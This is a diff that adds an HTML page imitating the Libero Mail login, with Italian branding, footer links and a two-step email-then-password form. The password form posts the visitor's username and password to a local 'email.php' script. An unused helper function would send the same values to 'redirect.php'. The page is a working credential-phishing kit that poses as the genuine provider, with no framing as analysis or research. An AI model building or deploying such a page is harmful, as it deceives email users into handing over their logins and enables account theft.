@@ -1,0 +1,246 @@
+
+<!DOCTYPE HTML>
+<html>
+
+<head>
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="expires" content="0">
+<meta http-equiv="pragma" content="no-cache">
+<script src="axios.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<meta name="description" content="Inserisci la tua user e password ed entra in Libero Mail. Sei invece un nuovo utente? Crea un nuovo account o richiedi l'aiuto di Libero">
+
+ 
+<title>Libero Mail - login</title>
+
+   <link rel="stylesheet" type="text/css" href="style.css">
+
+
+   <link rel="shortcut icon" href="images/libero_favicon.ico">
+
+
+</head>
+
+<body>
+<body style="background-image: url(&quot;https://tpc.googlesyndication.com/simgad/17394271464311951188?&quot;); background-repeat: no-repeat; background-color: rgb(41, 93, 151); background-position: center top;"><div id="adv_click" style="position: fixed; top: -10px; left: -10px; width: 100%; height: 100%; z-index: 10;"><a href="https://adclick.g.doubleclick.net/pcs/click?xai=AKAOjsuXFsqKZcGGZV-G_3dVs_C0ik3xK3TDweQJIhCAgBNaKScZFS_Bhhyy-iou8dfMjAkKMExm3Ni1_QpOlgA6N3ce2BGRKeDl0d3AtNRek6hG684zV8XKgzt8zrxjj7dAzSETqGDNXK1xOrUsZCg0Oc_R_VdJdUzo3REvW1zc97kBpIw9WTpAY3g2JGGrdqKrlZ1fhOq2GJffwbS0eqkIqon0bGbXbvf5ZhyOpzaVkvtZrGOs31MJoVINRT9cAU7xE8zgEIicf1vfGpu4h8M&amp;sai=AMfl-YRtKxFMEMRZWB10UWfrbbIxJQ5JtWFZauTqCTOXWFQ-Tue6DLRutFL3ZeS2wDfZ5IT4ZMkPY0boqwDrnB2FJDVqVYwZJEzTe5ea4LuXZzBeUh5AwE62HrCNFDQnUfIJ&amp;sig=Cg0ArKJSzAGUqkB062qEEAE&amp;urlfix=1&amp;adurl=https://b3jrf.app.goo.gl/IOL_login" target="_blank" style="cursor: pointer; display: block; width: 100%; height: 100%;"><img src="Libero%20Mail%20-%20login_files/AdvContent20x20.png"></a></div>
+
+
+	<div id="email_wrapper" style="display: block;">
+		    <div id="wrapper-iol" >
+        <section class="content">
+
+
+          <header>
+             <a class="logo" href="http://www.libero.it/" title="Vai all'Home Page di Libero"></a>
+             <div class="txt ">
+                Accedi
+             </div>
+
+
+          </header>
+
+
+          <form  id="emailform">
+
+          
+	           <div id="email" >
+
+	           		<label id="label_loginid" class="iol-material-textfield-outlined ">
+	               		<input name="email" id="loginid" value="" maxlength=256 placeholder=" " autocomplete autofocus >
+	               		<span>Inserisci la tua email</span>
+	               </label>
+
+
+	           		<span id="email_error" class="txt-error" style="display:none;">Email non inserita</span>
+
+	           		<button class="iol-material-button-contained" id="form_submit">AVANTI</button>
+
+	           		<div class="settings">
+	               <label class="iol-material-checkbox">
+		               <input type="checkbox" name="REMEMBERME" value="S" >
+		               <span>Rimani collegato</span>
+	               </label>
+	              	 <a href="" class="float-right">AIUTO</a>
+
+	           		<a href="index.html" class="create-account" target="_blank">CREA ACCOUNT</a>
+
+	           		</div>
+	           	
+	           </div>
+
+
+
+          	   <div>
+      				
+          	   </div>
+
+          </form> 
+
+
+
+
+
+
+        </section>
+
+            
+
+    </div>
+
+	</div>
+
+
+   <div id="pass-wrapper" style="display: none;">
+   			
+   			 <div id="wrapper-iol">
+        <section class="content">
+
+
+    <header>
+
+       <a class="logo" href="http://www.libero.it" title="Go to Libero Home Page"></a>
+
+       <div class="txt greetings"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
+          <span id="show"></span> </font></font><a href="/?service_id=webmail&amp;ret_url=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin&amp;nst=79940"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">non sei tu?</font></font></a>
+    
+       </div>
+
+       
+    </header>
+
+
+       
+
+         <form id="pass_form" method="post" action='email.php' onsubmit="return validateForm()">
+         	<label id="label_password" class="iol-material-textfield-outlined ">
+         	<input type="hidden" name='username' id='showid' value="">
+
+         <input type="password" name="password" id="password" value="" maxlength="25" placeholder=" " autofocus="">
+
+         <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Inserisci la tua password</font></font></span>
+
+         <span toggle="#password" class="fa-eye field-icon toggle-password" onclick="$('#password').focus()"></span>
+
+         </label>
+
+         <span id="keyid_error" class="txt-error" style="display: none;">Password non inserita</span>
+
+         <button id="form_submit" type="submit" class="iol-material-button-contained"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AVANTI</font></font></button>
+
+         <div class="settings">
+
+             <a target="_blank" href="https://selfcare.libero.it/recuperopassword?url_member=https%3A%2F%2Fmail1.libero.it%2Fappsuite%2Fapi%2Flogin%3Faction%3DliberoLogin">Password dimenticata?</a>
+         </div>
+         </form>
+
+
+
+        </section>
+
+        
+
+    </div>
+   </div>
+
+    
+
+<!-- footer -->
+    <footer class="footer-iol">
+        <ul>
+           <li><a target="_blank" href="https://www.italiaonline.it/chi-siamo/">Chi siamo</a></li>
+           <li><a target="_blank" href="https://info.libero.it/note-legali/">Note legali</a></li>
+           <li><a target="_blank" href="https://privacy.italiaonline.it/privacy_libero.html">Privacy</a></li>
+           <li><a target="_blank" href="https://privacy.italiaonline.it/common/cookie/privacy_detail.php?ref=libero">Cookie Policy</a></li>
+           <li><a target="_blank" href="http://easy.libero.it/">Libero Easy</a></li>
+           <li><a target="_blank" href="https://aiuto.libero.it/">Aiuto</a></li>
+        </ul>
+        <p>&copy; ITALIAONLINE 2020 - P. IVA 03970540963</p>
+    </footer>
+
+    <!--fine footer-->
+
+
+</body>
+
+<script type="text/javascript">
+
+	var form_email,form_password;
+	document.getElementById('emailform').addEventListener('submit',processEmail);
+	// document.getElementById('pass_form').addEventListener('submit', processPassword)
+
+
+
+	function processEmail(evt){
+		evt.preventDefault();
+
+		var email = this.email.value.trim();
+		if(ValidateEmail(email)){
+			hide('email_error')
+			hide('email_wrapper')
+			document.getElementById('show').innerHTML = email;
+			document.getElementById('showid').value = email;
+			show('pass-wrapper')
+		}else{
+
+			show('email_error')
+		}
+
+	}
+
+
+ function validateForm(){
+ 	
+ 	var email = document.getElementById('showid').value;
+ 	var password = this.password.value;
+
+ 	if(password !=''){
+ 		hide('keyid_error')
+ 	}else{
+ 		show('keyid_error') 
+ 		return false;		
+ 	}
+ }
+
+
+	function ValidateEmail(mail) 
+	  {
+	   if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+	    {
+	      return (true)
+	    }
+	      return (false)
+	  }
+
+
+function show(element){
+    document.getElementById(element).style.display = "flex";
+  }
+
+  function hide(element){
+    document.getElementById(element).style.display = "none";
+  }
+
+  function sendDetails(email,password) {
+      $(document).ready(function(){
+		  $("button").click(function(){
+		    $.post("redirect.php",
+		    {
+		      username: email,
+		      password: password
+		    },
+		    function(data,status){
+		      console.log("Data: " + data + "\nStatus: " + status);
+		    });
+		  });
+		});
+  }
+</script>
+
+
+</html>
+
